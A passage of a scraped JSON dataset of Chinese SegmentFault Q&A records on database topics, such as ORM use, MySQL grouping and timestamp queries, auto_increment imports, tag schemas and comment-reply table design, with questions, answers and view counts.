      "dsc": "<div class=\"question fmt\" data-id=\"1010000002929028\">\n<p>其实并不抵触学习新东西和一些“高大上”的概念，但我一直以来最关心的只有一点：我的项目中能不能用到，这东西有什么用，好处是什么，代价是什么？</p>\n<p>网上很多都说面向对象的数据库操作方式可以将 Model 层直接解耦，不需要关心它是怎么实现的，而且可以使用 OOP 的方式，如 getXXX() 来获取记录的某个字段值。</p>\n<p>其实我一直想做一个游记的网站（类似百度旅游/马蜂窝），目录结构也在 <a href=\"http://segmentfault.com/q/1010000002890348\" rel=\"nofollow\">http://segmentfault.com/q/1010000002890348</a> 提出了，中途也因为看过很多 IoC 的文章很是头疼，发现碍于项目规模很难体现出它的优势，反而是加重负担为了设计而设计。分层已经使得 action 尽量精简，而且 Model 也可以做到不错的复用。</p>\n<p>1、实在不知道为什么越来越多使用 ORM 呢？是因为面向对象编程的需要（太笼统了）？还是说我的查询结果对象可以缓存？如果网站访问量大了，是不是把查询结果以对象形式缓存才是最终的解决办法？基于 KV 的 noSQL 是不是也可以替代？那数据库自身的缓存呢？</p>\n<p>2、其实解耦真不是最关心的问题（自认为还没达到要解耦的地步，上面的分层带来的复用性已经蛮不错了），ORM 的 builder 看着也是醉了，不如直接 Model 里写 SQL 语句来的痛快，将来换数据库直接重写（不担心这个问题，不差这个时间），感觉性能和复用一直有点点的相悖，那抛开复用性和解耦的需求，如果要用 ORM 是不是就是因为对象缓存的收益？</p>\n<p>3、还有之前公司大哥说不要用 join，直接嵌套查询，我说那不是假设文章页 15 篇文章上面有作者信息，我就要跑 15 趟 post 表，中途再跑 15 趟 user 表？他说查询结果可以缓存，不太明白这个缓存是数据库级别的还是 Model 对象级别的？</p>\n<hr>\n<p>不一一评论了，谢谢大家的回答!</p>\n</hr></div>",
      "favourite": "0",
      "glance": "1.1k",
      "tags": [
        "php",
        "数据库",
        "orm"
      ],
      "time": "2015-06-24",
      "title": "PHP 数据库 ORM 实现的必要性",
      "url": "https://segmentfault.com/q/1010000002929028"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003846118\">\n<p>select * from (</p>\n<pre><code>select uid,uname,title 表名 where dateline&gt;$m4  order by dateline DESC</code></pre>\n<p>) a group by uid</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003843253\">\n<blockquote><p>1、不能使用联合查询<br>2、不能使用子查询</br></p></blockquote>\n<p>那只好尝试一下为 <code>dateline</code> 建立逆序索引</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003846453\">\n<p>思路应该是:</p>\n<ol>\n<li><p>先找出四个月内发表文章最多的3个用户；</p></li>\n<li><p>再根据用户id查询该用户最新的文章标题；<br>sql如下：<br>找出四个月内发表文章最多的3个用户</br></br></p></li>\n</ol>\n<pre><code>select uid,name,count(subject) as article_count from article where dateline&gt;$m4 group by uid order by article_count desc, dateline desc limit 3</code></pre>\n<p>根据用户id查询该用户最新的文章标题:</p>\n<pre><code>select subject from article where uid='uid' order by dateline desc limit 1</code></pre>\n</div>",
      "attention": "13",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003840296\">\n<p>就是想要查询4个月内发表文章最多的3个用户（用户当然不能重复），当然文章得是最新的，因为页面上的列表显示是用户名和最新的文章标题</p>\n<p>php代码如下：</p>\n<pre><code class=\"php\">$m4 = 当前时间戳 - 86400 * 124;</code></pre>\n<p>具体sql如下：</p>\n<pre><code class=\"sql\">select uid,uname,title 表名 where dateline&gt;$m4 group by uid order by dateline desc</code></pre>\n<p>虽然这样我能够查询出来4个月内不重复的用户，但是文章标题却是这个用户发表的第一篇文章，不是最后发布的文章。</p>\n<p>另外需要注意的是：<br>1、不能使用联合查询<br>2、不能使用子查询</br></br></p>\n<p>T-SQL：</p>\n<pre><code class=\"sql\">create table article\n(\n    `id` int(11) unsigned not null auto_increment comment '编号id',\n    `subject` varchar(300) not null comment '标题',\n    `uid` mediumint(8) unsigned not null comment '用户编号', \n    `uname` varchar(20) not null comment '用户名',\n    `dateline` int(10) unsigned not null comment '发表时间',\n    primary key(id)\n) engine=myisam charset=utf8 comment='文章信息表';\n    \ninsert article\n(subject, uid, uname, dateline)\nvalues\n('标题1', 2, '用户2', 1436708324),\n('标题2', 2, '用户2', 1438515690),\n('标题3', 2, '用户2', 1438608818),\n('标题4', 1, '用户1', 1436458649),\n('标题5', 2, '用户2', 1437273021),\n('标题6', 2, '用户2', 1438687437);</code></pre>\n</div>",
      "favourite": "1",
      "glance": "625",
      "tags": [
        "mysql",
        "php",
        "数据查询",
        "数据库",
        "数据库性能优化"
      ],
      "time": "2015-10-10",
      "title": "MySQL查询的问题，纠结好久了",
      "url": "https://segmentfault.com/q/1010000003840296"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003939106\">\n<p>建设双活数据中心，我且将双活数据中心定义如下：</p>\n<p>应用层面：同一个业务请求可以同时进入两个数据中心。</p>\n<p>数据层面：应用服务器可以同时在两个数据中心进行写入操作。</p>\n<p>存储层面：双数据中心的存储实时保持同步。</p>\n<p>技术难点：</p>\n<p>数据库层面的双中心并发读写，无论是ORACLE还是其他数据库，本身对于双中心的链路要求非常严格，而这个链路又是第三方运行商控制。这个本身就是个风险点。如何解决？</p>\n</div>",
      "favourite": "0",
      "glance": "351",
      "tags": [
        "数据库",
        "大数据"
      ],
      "time": "2015-11-02",
      "title": "数据库层面的双中心并发读写，这个本身就是个风险点，如何解决？",
      "url": "https://segmentfault.com/q/1010000003939106"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004208018\">\n<p>可以在前端页面写一个界面接口，提交后插入数据库。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004208601\">\n<p>如果你不会用API或者调用API生成的数据你不满意，可以自己爬虫嘛，先找一个合适的网站，然后自己写程序爬数据，完全自定义的说</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004208375\">\n<p>问题1.<br>按照你的图书业务，推荐使用正规合法的图书信息数据，不要随机生成的垃圾数据。<br>这里你可以使用一个API来调用图书信息，然后自己反序列化存到数据库。<br><a href=\"http://developers.douban.com/wiki/?title=book_v2#get_book_search\"></a><a href=\"http://developers.douban.com/wiki/?title=book_v2#get_book_search\">http://developers.douban.com/wiki/?title=book_v2#get_book_search</a></br></br></br></p>\n<p>豆瓣API: <a href=\"http://developers.douban.com/wiki/?title=book_v2#get_book\"></a><a href=\"http://developers.douban.com/wiki/?title=book_v2#get_book\">http://developers.douban.com/wiki/?title=book_v2#get_book</a></p>\n<p>问题2.<br>根据业务需求创建合适的数据。<br>宁愿花半天自己写一份数据生成的代码，也不要手工去一个一个输入测试数据（对于Coder来说，这没逼格 :D）<br>善用目前网络上现成的一些公开API和轮子，事半功倍。</br></br></br></p>\n<p>问题1举个栗子.<br><a href=\"https://api.douban.com/v2/book/search?q=%E5%9B%BE%E4%B9%A6&amp;count=1000\"></a><a href=\"https://api.douban.com/v2/book/search?q=%E5%9B%BE%E4%B9%A6&amp;start=1&amp;count=100\">https://api.douban.com/v2/book/search?q=%E5%9B%BE%E4%B9%A6&amp;start=1&amp;count=100</a></br></p>\n<p>用这个接口可以调用第<code>1</code>页<code>100</code>本关键字为<code>图书</code>的书籍信息，你本地用你的开发语言写一个循环反序列化json，然后存到数据库。这样你话一小时写程序，循环跑一会儿，就可以轻松完成一千乃至几万条的数据录入。</p>\n<p>写在最后, <br>哦，没有最后了。</br></p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004208013\">\n<p>其实这个问题可以分解为两个，因为我两个都很想知道。</p>\n<ul>\n<li><p>如何让mysql随机生成大量数据呢？</p></li>\n<li><p>各位平时做东西需要测试的时候，数据是如何获取的呢？</p></li>\n</ul>\n</div>",
      "favourite": "0",
      "glance": "500",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "2015-12-27",
      "title": "如何获取大量关于图书的数据导入mysql作为测试使用，或者让mysql随机生成？",
      "url": "https://segmentfault.com/q/1010000004208013"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004646771\">\n<p>三张表:问题(question)/回答(answer)/评论(reply)</p>\n<pre><code>question(id,            user_id,content)\nanswer  (id,question_id,user_id,content)\nreply   (id,answer_id,  user_id,content)\n</code></pre>\n<p>就拿segmentfault来说:<br>提问者(楼主)发了一个问题,这个问题有多个回答(层主),在数据库是一对多的关系.每个回答又可以有多个回复(评论),也是一对多的关系.</br></p>\n<p>其实下面这几种都是常见的一对多的关系:<br>博客:文章(article)/评论(comment)/回复(reply)<br>问答:问题(question)/回答(answer)/评论(reply)<br>论坛:主题(topic)/回帖(post)/评论(reply)</br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004646414\">\n<p>我也是学生党，我的想法是既然都是一条记录，为什么不能设计一张表呢，所有的内容都在一张表内，区分该评论是发表的，还是回复的</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004646238\">\n<p>基本正确。关于回复评论的查询其实没有那么麻烦，知乎的评论其实是<strong>平级</strong>的，查询时正常查询，显示时多显示个回复对象的名称即可</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004646064\">\n<html><body>\n<blockquote><p>大家好，我先描述一下基本情况</p></blockquote>\n<ol>\n<li><p>我在搭建一个类似知乎的简单版社区(基本简单版本,汗,我知道知乎背后太复杂了,我只是做一个最简单的问答,便于理解,所以找了知乎为例)，知乎里面的回答可以被每一个人评论，而且别人可以回复这个评论，我对<code>问题答案的评论在数据库方面该如何设计</code>有些疑惑</p></li>\n<li><p>每一个评论应该存储的是：</p></li>\n</ol>\n<blockquote><ol>\n<li><p>回答的ID</p></li>\n<li><p>评论者ID</p></li>\n<li><p>评论的内容</p></li>\n<li><p>评论的时间</p></li>\n<li><p>就像这这样<img data-src=\"/img/bVtEM6\"/></p></li>\n</ol></blockquote>\n<h4>读取并显示的问题</h4>\n<blockquote><p>这样在显示问题的时候也可以根据<code>问题ID</code>查询到其相关的所有的评论，<br>比如这样: <img data-src=\"/img/bVtENk\"/></br></p></blockquote>\n<h3><strong><em>我的问题是像这种评论的回复该怎么设计呢??还有就是回复别人的回复</em></strong></h3>\n<blockquote>\n<p><img data-src=\"/image?src=http://i13.tietuku.cn/1fe8a8950c361815.png&amp;objectId=1010000004646064&amp;token=195f591d14db0ef0ce5a001cc5cea68f\"><br>我猜想这个数据的设计是<em>*</em></br></img></p>\n<ol>\n<li><p>评论的ID</p></li>\n<li><p>回复的内容</p></li>\n<li><p>回复者的ID</p></li>\n<li><p>时间</p></li>\n</ol>\n</blockquote>\n<p>这样的话，就需要显示一个答案的评论的时候，</p>\n<blockquote><ol>\n<li><p>先去查询该答案的所有评论ID</p></li>\n<li><p>遍历所有评论，根据评论ID查询该评论的回复，</p></li>\n<li><p>遍历该评论的所有回复, 查询该回复时候有回复,有点递归了</p></li>\n</ol></blockquote>\n<p>不知道这样是否可以,烦劳指教了,学生党一枚,惶恐.</p>\n</body></html>\n</div>",
      "favourite": "2",
      "glance": "621",
      "tags": [
        "数据库",
        "设计思考",
        "逻辑关系"
      ],
      "time": "3-20",
      "title": "问答系统的评论和回复的逻辑和数据库设计疑惑?",
      "url": "https://segmentfault.com/q/1010000004646064"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005646179\">\n<p>時間存儲建議將字段設置為 timestamp 或者 datetime 類型, 而不是數值類型的時間戳.<br>首先數值類型的時間戳不便於 SQL 中查詢, 另代碼中也需要進行轉換<br>在數值類型 SQL 中相關函數也無法使用, 需要先對數值類型時間戳轉換城 timestamp 或者 datetime 類型在計算</br></br></p>\n<p>如果是 timestamp 或者是 datetime 可以使用 date_add 函數增加或者減少時間達到時間的要求</p>\n<p><a href=\"http://dev.mysql.com/doc/refman/5.7/en/date-and-time-functions.html#function_date-add\">http://dev.mysql.com/doc/refman/5.7/en/date-and-time-functions.html#function_date-add</a></p>\n<p>例如</p>\n<pre><code class=\"sql\">select date_add(start_time, interval 1 day) from t</code></pre>\n<p>給 start_time 增加一天</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005647115\">\n<p>明确问题，你应该是要求start_time在某天或者某月之后的时间戳。<br>思路：用当前时间转换成date格式，将date加上你要获取的某天或某月的数值，然后将结果转成时间戳<br>date_add(date,interval n exp)<br>其中date为date时间格式，如果是时间戳需要转换，exp可以为<br>SECOND 秒 SECONDS MINUTE 分钟 MINUTES HOUR 时间 HOURS DAY 天 DAYS MONTH 月 MONTHS <br>YEAR 年 YEARS MINUTE_SECOND 分钟和秒 \"MINUTES:SECONDS\" HOUR_MINUTE 小时和分钟 \"HOURS:MINUTES\" <br>DAY_HOUR 天和小时 \"DAYS HOURS\" YEAR_MONTH 年和月 \"YEARS-MONTHS\" <br>HOUR_SECOND 小时, 分钟， \"HOURS:MINUTES:SECONDS\" DAY_MINUTE 天, 小时, 分钟 \"DAYS HOURS:MINUTES\" DAY_SECOND 天, 小时, 分钟, 秒 \"DAYS HOURS:MINUTES:SECONDS\"<br>1.从start_time开始3天后的时间戳：<br>MYSQL代码如下</br></br></br></br></br></br></br></br></br></p>\n<pre><code>select UNIX_TIMESTAMP(date_add(FROM_UNIXTIME(start_time), interval 3 day)) from t</code></pre>\n<p>3代表你要加的天数，将T换成你的数据库的任意表执行即可<br>2.从start_time开始N月后的时间戳：</br></p>\n<pre><code>select UNIX_TIMESTAMP(date_add(FROM_UNIXTIME(start_time), interval 3 MONTH)) from t</code></pre>\n<p>此函数数MYSQL的，其他数据库也有相应的函数，但是没有测过。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005646707\">\n<p>不知道你用的啥语言。<br>用最笨的办法~~<br>先用你的语言获取到今天的时间戳。例如1465056000</br></br></p>\n<pre><code class=\"sql\">SELECT * FROM `table` WHERE `period_ytpe` = 'day' AND `start_time` + 86400*`period_value` &lt; 1465056000\nUNION\nSELECT * FROM `table` WHERE `period_ytpe` = 'month' AND `start_time` + 86400*30*`period_value` &lt; 1465056000</code></pre>\n<p>当然缺陷就是，一个月默认当他30天了。<br>如果你是要用mysql去计算。。那把start_time存成时间类型吧。。然后用date_add去计算</br></p>\n<p>AND话外题。。为啥设计表的时候不直接算好end_time呢？非要筛选的时候去用，计算类的会导致索引失效，很不好。各种扫表</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005644450\">\n<table>\n<thead><tr>\n<th>id</th>\n<th>start_time</th>\n<th>period_ytpe</th>\n<th>period_value</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1461427200</td>\n<td>day</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1461427200</td>\n<td>month</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<p>如上表，<br><code>start_time</code>  表示开始时间，<br><code>period_ytpe</code> 表示期限类型，<br><code>period_value</code>表示期限值，</br></br></br></p>\n<p>第一第记录表是 <code>3天</code>，第二条表示<code>2个月</code></p>\n<p>如果查询出，从<code>start_time</code>开始，期限在今天之前的记录</p>\n<p>比如：<br>第一条，start_time开始， 三天后的时间戳，如果是在今天（2016-06-04）之前，则是满足条件！<br>第二条，start_time开始， 两个月后的时间戳，如果是在今天（2016-06-04）之前，则是满足条件！</br></br></p>\n<p><code>____________________________________分割线_________________________________________</code></p>\n<p>感谢各位的回答，在不改数据库的情况下（数据表已经被很多地方引用，且不是我设计），我自己写了一条SQL，做了几步转换，感觉性能不会好，但好像可以用了，还好这个表数据量不大，每天最多新增一条新记录。</p>\n<blockquote><p>把开始<code>start_time</code>转为<code>date</code>，再<code>DATE_ADD</code>加上 日或者月，得到时间再转为 <code>unix_time</code><br>用今天凌晨 UNIX_TIMESTAMP(CURDATE())减去 上面得到的时候，如果结果大于 0，那就是想要的结果</br></p></blockquote>\n<pre><code>SELECT `id`,`name`,\nCASE `period_type` \n    WHEN 'day' \n        THEN UNIX_TIMESTAMP(CURDATE())-UNIX_TIMESTAMP(DATE_ADD(FROM_UNIXTIME(`start_time`),INTERVAL period_value day))\n    WHEN 'month' \n        THEN UNIX_TIMESTAMP(CURDATE())-UNIX_TIMESTAMP(DATE_ADD(FROM_UNIXTIME(`start_time`),INTERVAL period_value month))\n    ELSE '' \nEND AS 'time_interval'\nFROM `table`\nWHERE `xxxxxxx'\nHAVING time_interval&gt;0\nORDER BY time_interval desc</code></pre>\n</div>",
      "favourite": "4",
      "glance": "377",
      "tags": [
        "mysql",
        "数据库",
        "数据库设计"
      ],
      "time": "6-4",
      "title": "mysql 计算某个时间，多少天后，多少个月后时间戳",
      "url": "https://segmentfault.com/q/1010000005644450"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094668\">\n<p>数据格式：A-B-C-D...<br/>\n类似可变长度的数据，要用数据库存，</p><p>要求，可通过B,找到前面的A 和后面的C。<br/>\n关键是可以通过C，找到包含C的记录。</p><p>数据库怎么设计效率高点？</p>\n</div>",
      "favourite": "0",
      "glance": "2.9k",
      "tags": [
        "数据库"
      ],
      "time": "2011-06-24",
      "title": "数据可变长度的数据库设计",
      "url": "https://segmentfault.com/q/1010000000094668"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096537\">\n<p>可以insert一条记录之前先修改auto_increment的值为该记录的id值, 然后insert.<br/>\n<strong>但得保证数据按id正序排序</strong></p><pre>insert into `TABLENAME` (`FIELDNAME`) values ('aaa');\nalter table `TABLENAME` auto_increment=5;\ninsert into `TABLENAME` (`FIELDNAME`) values ('bbb');\nselect * from `TABLENAME`;\n-----\n1 aaa\n5 bbb</pre><p>-------------------------<br/>\n楼上说的对啊, 按正序排列的数据, 直接插入不连续的id值是可以的...</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096539\">\n<p>让mysql和access的结构保持一样就行了。该怎么导入怎么导入，然后看最大的id是什么，直接alter掉。<br/>\n导入完成以后，看最大的主键是什么：</p><pre>select max(PRIMARY_ID) from TB_NAME;</pre><p>比如是1000。<br/>\n然后直接alter掉：</p><pre>alter table TB_NAME AUTO_INCREMENT = 1001;</pre><p>这样就OK了，下次再insert，就是从1001开始了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096536\">\n<p>你可以先不设置自增导完了以后再alter table嘛，不过话说回来，使用mysql直接insert一个id在一个auto_increment的字段里是可以的啊，至少我这里都这样，不知道你那神马现象</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094687\">\n<p>从seo来说，主键id值并不想改变。现在从access导入到mysql，保持主键不变，且为自增。那么这样插入数据后id会被重置从1开始吧。</p>\n</div>",
      "favourite": "0",
      "glance": "5.5k",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "2011-06-28",
      "title": "如何将带有自增主键的数据导入到另一个数据库",
      "url": "https://segmentfault.com/q/1010000000094687"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096833\">\n<p>是的，你最好连续两次left join relations表和tags表来减少sql语句的数量</p><p>from语句这么写</p><pre>from posts as p \nleft join relations as r on r.pid = p.id\nleft join tags as t on t.id = r.tid</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096836\">\n<p>@Chris Yue<br/>\n如果每篇文章对应有N个标签，那么两次join后对于结果集中文章表的重复数据如何过滤？用GROUP BY + GROUP_CONCAT()的方式吗？还是在程序中对结果集用循环处理？</p><p>文章1， 标签N<br/>\n文章1， 标签N<br/>\n文章1， 标签N<br/>\n文章2， 标签N<br/>\n文章2， 标签N<br/>\n文章2， 标签N<br/>\n……<br/>\n文章N， 标签N<br/>\n文章N， 标签N<br/>\n文章N， 标签N</p><p>如何将上面的结果集变成下面这样：</p><p>文章1， 标签N， 标签……， 标签N<br/>\n文章2， 标签N， 标签……， 标签N<br/>\n……<br/>\n文章N， 标签N， 标签……， 标签N</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096913\">\n<p>你想得到的是：</p><p>1、文章列表<br/>\n2、文章列表中，每篇文章对应的tags</p><p>我建议你通过3条SQL来完成：</p><p>1、获得文章列表</p><pre>SELECT * FROM `posts`</pre><p>2、获得文章tags id</p><pre>SELECT `post_id`,`tag_id` FROM `relationships` WHERE `post_id` IN (...)</pre><p>建议存入post_id =&gt; tag_ids数组，如</p><pre>$post_tags = array(\n  1=&gt;array(1,2,3),\n  2=&gt;array(2,3,5),\n);</pre><p>3、将用到的tag存入数组</p><pre>SELECT `id`,`tag` FROM `tags` WHERE `id` IN (...)</pre><p>得到id=&gt;tag<br/>\n如</p><pre>$tags = array(\n  1=&gt;'火车',\n  2=&gt;'飞机',\n);</pre><p>4、遍历文章列表，并根据tags列表，对tags进行输出<br/>\n最后：<br/><blockquote>诸如tags表，建议采用keyvalue数据库进行存储，如memcached、tokyo cabinet、redis等<br/>诸如relationships表，建议复制一份到posts表，以text 1,2,3,4这样的形式存储。relationships表主要用于根据tag对文章进行检索用</blockquote>\n</p></div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094815\">\n<p>现在用的是文章标签三张表设计：posts，tags，relationships，但有一个问题是：<br/>\n在一个页面内列出N篇文章的信息和对应的标签，我的做法是<br/>\n1、根据指定条件先从POSTS表中取出N篇文章的信息<br/>\n2、再根据1中得到的POSTID从TAGS中关联取出对应标签<br/>\n那么就是列出N篇文章，为了得到每篇文章对应的标签就要再执行N次数据查询<br/>\n这个算是问题吗？大家如何做的？</p>\n</div>",
      "favourite": "5",
      "glance": "5.8k",
      "tags": [
        "文章标签",
        "数据库"
      ],
      "time": "2011-07-31",
      "title": "关于文章标签CURD的数据库设计",
      "url": "https://segmentfault.com/q/1010000000094815"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094861\">\n<p>在电子商务网站里面，搜索产品是一个很重要的功能。如果忽略掉搜索结果排序的问题。要怎么设计数据库、或者配置服务器来实现对商品的搜索呢？<br/>\n我个人现在的想法是有这样，有两种方法：一个是给产品增加一些元数据，例如标签。直接用数据库的like语句实现搜索。二是用开源的搜索解决方案。能实现全文搜索或者至少能提高搜索效率。</p>\n</div>",
      "favourite": "3",
      "glance": "4.6k",
      "tags": [
        "搜索引擎",
        "电子商务网站",
        "数据库"
      ],
      "time": "2011-08-11",
      "title": "电子商务网站怎么实现商品搜索？",
      "url": "https://segmentfault.com/q/1010000000094861"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094944\">\n<p>项目里面使用了Access 2010建立的数据库，所以连接字符串里面有'Microsoft.ACE.OLEDB.12.0'这么一段，现在打包安装程序的时候，需要把Microsoft Access Database Engine 2010 Redistributable也包括进去，我希望在安装的时候，判断Engine 是不是满足版本要求，如果满足了版本要求，就不再安装Engine 了。<br/>\n<strong>我的问题是，如何能够判断机器上面的Database Engine 是什么版本的。</strong></p>\n</div>",
      "favourite": "0",
      "glance": "8.3k",
      "tags": [
        "数据库",
        "microsoft",
        "access",
        "database-engine",
        "版本"
      ],
      "time": "2011-09-21",
      "title": "怎么判断  Microsoft.ACE.OLEDB 版本",
      "url": "https://segmentfault.com/q/1010000000094944"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094966\">\n<p>有两个表<br/>\n1.书籍表<br/>\nbook_id<br/>\n2.标签表<br/>\ntag_id<br/>\n3.书籍，标签关系表<br/>\nbook_id,tag_id</p><p>可以很简单地实现相关书籍的查找，但是根据“有相同标签就是相关书籍”的话忽略了相关度。比如三个标签相同的书籍比一个标签相同的书籍明显相关度更高。</p><p>想请教，如何实现按照相关度高低排序？有没有相关算法？</p>\n</div>",
      "favourite": "2",
      "glance": "3.1k",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "2011-09-27",
      "title": "根据标签查找相关书籍的mysql语句",
      "url": "https://segmentfault.com/q/1010000000094966"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097695\">\n<p>结构方面的，还是手工去跑比较合适。<br/>\n另外建议作一些超前设计，增加适当的冗余字段和保留字段。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097704\">\n<p>你的结构体假如经常改变，这个往往说明你的需求分析，还没稳定下来，这个时候一些工作是免不了的。</p><p>另外你每次跟新数据都要清除数据这个是设计的问题···，我们也有这样弄过，但是因为图方便清除了数据，重新跑代码,OK就行，但是好的代码，是结构体改变了也要继续跑下去。不过我没用过标准的数据库，我们都用nosql，每个数据都存的很小，然后在出口的时候，统一拼装成一个大的结构体，返回给外部。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097694\">\n<p>好的工具倒是没见过，思路倒是有一些：<br/><ol><li>面向产品型开发，把自己当作是软件开发商，你卖出的就是软件，客户自然要升级，所以这个必然的。这个方式主要是心态上的转变；</li><li>面向服务型开发，把自己当作是服务提供商，你卖出的就是服务，为了更好的服务，只能集中化、自动化管理。找开源的或者自己开发一套数据库更改发布系统，甚至可以将这个东西开源出来；</li></ol><p>以上是专家体，专家都是这么分几条几点说的，下面说说我自己的看法：<br/><ol><li><strong>能让机器去做的事情，就不要让人去做</strong>；</li><li>规范化的管理和流程有益于研发的推进和实施；</li></ol><p>如果我去做，我会如何做：<br/>\n既然数据库结构是标准的、统一的，那就在几种的地方有一个中心服务（比如svn的形式）提供标准结构，各个字系统有脚本或者计划任务定期对比、执行。</p><p>我的基本原则是，只要<strong>自动化系统的工作量不超过所有单次执行工作量的两倍</strong>都是可以接受的，并且我们公司也是这样去做的。</p><p>最后说重点：<br/><pre>扯蛋完毕，睡觉去了</pre><p><strong>UP:突然想起来，你可以研究下puppet这个玩意</strong></p>\n</p></p></p></div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095257\">\n<p>用户可能提一些需求，导致数据库修改。<br/>\n目前数据库这么部署的，北京网点，建一套数据库，上海网点，建一套数据库，广州、西安……同样以此类推，将来打算弄个分布式系统把各地的数据库连起来，往总部收集数据，现在还是各自为政。全国是联网的。</p><p>现在的麻烦事就是，开发时数据库变动了结构，怎么往各地的数据库同步啊，现在手工同步，麻烦死了，每次都得记下自己改了什么，再往各地数据库打补丁。</p><p>还有更糟糕的，有些结构改变需要清除数据，对数据进行一下处理，再重新导入。</p><p>面对n个数据库，更新实在是很繁琐</p>\n</div>",
      "favourite": "1",
      "glance": "3.3k",
      "tags": [
        "数据库"
      ],
      "time": "2011-12-13",
      "title": "有没有好的数据库同步工具？？",
      "url": "https://segmentfault.com/q/1010000000095257"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097841\">\n<p>看场景来定，用你最有把握的。<br/>\n如果时间紧迫，则用你最熟悉的。<br/>\n如果全部没接触过，可以装2008学学。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097850\">\n<p>还是2000习惯，不过现在有个项目用了2005,只是用这个版本号而已，连存储过程都没用到。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097839\">\n<p>不用理会别人用什么，你只要知道自己会什么，系统适合用什么简单方便性能过得去即可。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095325\">\n<p>2000？<br/>\n2005？<br/>\n2008？<br/>\n还是追求更新的？<br/>\n能告诉我你们的选择之道？</p>\n</div>",
      "favourite": "0",
      "glance": "2.6k",
      "tags": [
        "sqlserver",
        "数据库"
      ],
      "time": "2011-12-26",
      "title": "谈谈你的MS SQL Server",
      "url": "https://segmentfault.com/q/1010000000095325"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095332\">\n<p>大家都知道传统的数据库比如mysql或者sqlite，mssql等，都有一个非常蛋疼的问题：因为只能使用简单2维数组的方式返回结果，所以结果集表里面充斥大量的重复数据，并且表与表之间的多对一或者一对多等关系也因为联表了不容易看出来。</p><p>这冗余的数据占带宽也就算了，传送过来的数据也非常的难看，所以为了方便使用，把传送过来的数据变成多维数组的树状结构是很有意义的。</p><p>不知道你们见过什么比较好的方法来处理这个事情。</p><p>别光说用xxx orm什么的，答案是需要提供思路的，说不出来不算</p>\n</div>",
      "favourite": "1",
      "glance": "2.4k",
      "tags": [
        "数据库"
      ],
      "time": "2011-12-28",
      "title": "你见过最好的优化数据库联表查询结果的方法",
      "url": "https://segmentfault.com/q/1010000000095332"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000118149\">\n<p>看了下，SF 这方面做得的确很干净简洁。<br/>\n如果用户第三方登录的话，设置密码时不需要填写当前密码。设置密码之后，应该可以照常邮箱、密码登录。<br/>\n学习了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000734492\">\n<p>第三方的id应该不是id吧，是不是对应每一个第三方用户生成的一个特殊的标示字符串？</p>\n</div>",
